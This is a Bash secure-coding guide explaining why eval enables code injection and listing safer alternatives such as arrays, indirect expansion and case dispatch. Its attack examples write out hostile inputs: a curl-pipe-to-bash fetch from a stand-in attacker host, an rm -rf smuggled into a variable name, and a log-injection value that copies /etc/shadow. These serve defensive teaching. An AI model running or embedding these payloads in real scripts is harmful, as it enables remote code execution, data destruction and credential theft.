## Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary—better alternatives exist for almost all use cases.**

**Rationale:**
- **Code Injection**: `eval` executes arbitrary code with full script privileges (file access, network, commands)
- **Bypasses Validation**: Even sanitized input can contain metacharacters enabling injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Better Alternatives**: Arrays, indirect expansion, and associative arrays handle nearly all use cases safely

**Understanding eval:**

`eval` takes a string, performs all expansions, then executes the result—performing expansion TWICE:

```bash
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
```

**Attack Examples:**

```bash
# Attack 1: Direct Command Injection
eval "$user_input"
# Attacker: 'curl https://attacker.com/backdoor.sh | bash'

# Attack 2: Variable Name Injection
eval "$var_name='$var_value'"
# Attacker var_name: 'x=$(rm -rf /important/data)'
# Executes command substitution!

# Attack 3: Log Injection
eval "echo \"$timestamp - Event: $event\" >> /var/log/app.log"
# Attacker event: 'login"; cat /etc/shadow > /tmp/pwned; echo "'
```

**Safe Alternatives:**

```bash
# Alternative 1: Arrays for Command Construction
cmd=(find "$search_path" -type f -name "$file_pattern")
"${cmd[@]}"  # Array preserves exact arguments, no injection

# Alternative 2: Indirect Expansion for Variable References
# ✗ eval "value=\\$$var_name"
# ✓ echo "${!var_name}"
# ✓ printf -v "$var_name" '%s' "$value"  # Safe assignment

# Alternative 3: Associative Arrays for Dynamic Data
# ✗ eval "var_$i='value $i'"
# ✓ declare -A data; data["var_$i"]="value $i"

# Alternative 4: Case/Arrays for Function Dispatch
# ✗ eval "${action}_function"
# ✓ case "$action" in
#     start) start_function ;; stop) stop_function ;;
#     *) die 22 "Invalid action ${action@Q}" ;;
#   esac
# ✓ declare -A actions=([start]=start_function [stop]=stop_function)
#   [[ -v "actions[$action]" ]] && "${actions[$action]}"

# Alternative 5: Direct Command Substitution
# ✗ eval "output=\\$($cmd)"
# ✓ declare -a cmd=(ls -la /tmp); output=$("${cmd[@]}")

# Alternative 6: Read for Parsing key=value
# ✗ eval "$config_line"
# ✓ IFS='=' read -r key value <<< "$config_line"
#   [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]] && declare -g "$key=$value"

# Alternative 7: Arithmetic Expansion
# ✗ eval "result=$((user_expr))"
# ✓ [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]] && result=$((user_expr))
# ✓ result=$(bc <<< "$user_expr")  # Isolates operations
```

**Edge Cases:**

```bash
# Dynamic variables in loops
# ✗ eval "${service}_status=\\$(systemctl is-active $service)"
# ✓ declare -A service_status
#   service_status["$service"]=$(systemctl is-active "$service")

# Building complex commands with options
# ✗ cmd="find /data -type f"; cmd="$cmd -name '$pattern'"; eval "$cmd"
# ✓ declare -a cmd=(find /data -type f)
#   [[ -n "$pattern" ]] && cmd+=(-name "$pattern")
#   "${cmd[@]}"

# Sourcing config with variable expansion
# ✓ source config.txt  # Bash expands variables directly
# ✓ Better: validate first
if grep -qE '(eval|exec|`|\$\()' config.txt; then
  die 1 'Config file contains dangerous patterns'
fi
source config.txt
```

**Anti-patterns:**

```bash
# ✗ eval "$user_command"
# ✓ case "$user_command" in start|stop|restart) systemctl "$user_command" myapp ;; esac

# ✗ eval "$var_name='$var_value'"
# ✓ printf -v "$var_name" '%s' "$var_value"

# ✗ eval "if [[ -n \\$$var_name ]]; then echo set; fi"
# ✓ [[ -v "$var_name" ]] && echo set

# ✗ eval "echo \\$$var_name"
# ✓ echo "${!var_name}"
```

**Detecting eval usage:**

```bash
grep -rn 'eval.*\$' /path/to/scripts/  # eval with variables (very dangerous)
shellcheck -x script.sh                 # SC2086 warns about eval
```

**Summary:**
- **Never use eval with untrusted input**—no exceptions
- **Use arrays** for dynamic commands: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion**: `echo "${!var_name}"`
- **Use associative arrays**: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch
- **Key principle:** If you think you need `eval`, you're solving the wrong problem
